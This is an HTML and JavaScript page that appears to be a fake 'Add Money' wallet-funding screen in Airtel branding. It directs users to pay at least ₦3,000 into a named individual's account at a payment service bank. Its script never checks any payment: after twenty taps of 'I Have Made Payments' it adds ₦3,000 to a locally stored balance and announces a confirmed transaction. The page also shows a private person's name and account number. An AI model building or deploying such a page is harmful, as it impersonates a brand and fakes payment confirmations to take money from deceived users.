<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
  <title>Add Money - Airtel Theme</title>
  <style>
    body {
      margin: 0;
      font-family: "Segoe UI", sans-serif;
      background: #fefefe;
      overflow-x: hidden;
      position: relative;
      touch-action: manipulation;
    }

    body, input, button {
      -webkit-user-select: none;
      user-select: none;
    }

    .airtel-bg {
      position: fixed;
      width: 100%;
      height: 100%;
      background: radial-gradient(rgba(255, 0, 0, 0.05), transparent);
      overflow: hidden;
      z-index: -1;
    }

    .logo-piece {
      position: absolute;
      width: 25px;
      height: 25px;
      background-image: url('airtel-logo.png');
      background-size: cover;
      opacity: 0.15;
      animation: float 10s linear infinite;
    }

    @keyframes float {
      from {
        transform: translateY(100vh) rotate(0deg);
      }
      to {
        transform: translateY(-10vh) rotate(360deg);
      }
    }

    .container {
      padding: 20px;
      text-align: center;
    }

    .airtel-logo {
      width: 80px;
      margin: 10px auto;
    }

    .input-box {
      background: #fff;
      padding: 20px;
      border-radius: 15px;
      box-shadow: 0 0 12px rgba(0, 0, 0, 0.05);
      max-width: 360px;
      margin: 0 auto;
    }

    input {
      width: 90%;
      padding: 10px;
      font-size: 16px;
      border: 2px solid #dcdcdc;
      border-radius: 8px;
      outline: none;
      margin-bottom: 10px;
    }

    button {
      padding: 12px 25px;
      background: red;
      color: white;
      border: none;
      border-radius: 8px;
      font-size: 16px;
      cursor: pointer;
    }

    .hidden {
      display: none;
    }

    .popup {
      position: fixed;
      top: 40%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 25px;
      box-shadow: 0 0 12px rgba(0,0,0,0.2);
      border-radius: 12px;
      z-index: 20;
      max-width: 80%;
    }

    .account-details {
      margin-top: 25px;
      background: rgba(255,255,255,0.9);
      padding: 20px;
      border-radius: 15px;
      max-width: 350px;
      margin-left: auto;
      margin-right: auto;
    }

    .back-btn {
      margin-top: 20px;
      display: block;
      text-decoration: none;
      background: #ccc;
      padding: 10px 20px;
      color: black;
      border-radius: 10px;
    }

  </style>
</head>
<body>

  <div class="airtel-bg" id="bgContainer"></div>

  <div class="container">
    <img src="airtel-logo.png" class="airtel-logo" alt="Airtel Logo" />

    <div class="input-box">
      <input type="number" id="amountInput" placeholder="Enter amount (min ‚Ç¶3000)" />
      <button onclick="handleContinue()">Continue</button>
    </div>

    <div class="account-details hidden" id="accountDetails">
      <img src="airtel-logo.png" class="airtel-logo" alt="Logo" />
      <p><strong>Make Payment To:</strong></p>
      <p>EMMANUEL OKWUNNA</p>
      <p>SmartCash Payment Service Bank</p>
      <p>812 489 0070</p>
      <button onclick="handleTap()">I Have Made Payments</button>
      <a href="dashboard.html" class="back-btn">‚Üê Back to Dashboard</a>
    </div>
  </div>

  <div class="popup hidden" id="popupBox"></div>

  <script>
    // Background animation
    const bg = document.getElementById('bgContainer');
    for (let i = 0; i < 40; i++) {
      const logo = document.createElement('div');
      logo.classList.add('logo-piece');
      logo.style.left = Math.random() * 100 + 'vw';
      logo.style.top = Math.random() * 100 + 'vh';
      logo.style.animationDuration = (8 + Math.random() * 5) + 's';
      bg.appendChild(logo);
    }

    const popup = document.getElementById('popupBox');
    const accountBox = document.getElementById('accountDetails');

    let tapCount = parseInt(localStorage.getItem("tapCount")) || 0;
    let balance = parseInt(localStorage.getItem("balance")) || 0;

    function showPopup(message) {
      popup.innerHTML = `<p>${message}</p>`;
      popup.classList.remove("hidden");
      setTimeout(() => popup.classList.add("hidden"), 3000);
    }

    function handleContinue() {
      const amount = parseInt(document.getElementById('amountInput').value);
      if (isNaN(amount) || amount < 3000) {
        showPopup("‚ùå Please input minimum of ‚Ç¶3,000");
        return;
      }

      showPopup("‚è≥ Please wait...");
      setTimeout(() => {
        accountBox.classList.remove("hidden");
      }, 1500);
    }

    function handleTap() {
      tapCount++;
      localStorage.setItem("tapCount", tapCount);

      if (tapCount >= 20) {
        tapCount = 0;
        balance += 3000;
        localStorage.setItem("tapCount", tapCount);
        localStorage.setItem("balance", balance);

        showPopup("üéâ Congratulations! You have just funded your wallet with ‚Ç¶3,000 through transfer. Your transaction has been confirmed.");
      } else {
        showPopup("‚è≥ Please wait, confirming payment...");
      }
    }
  </script>
</body>
</html>
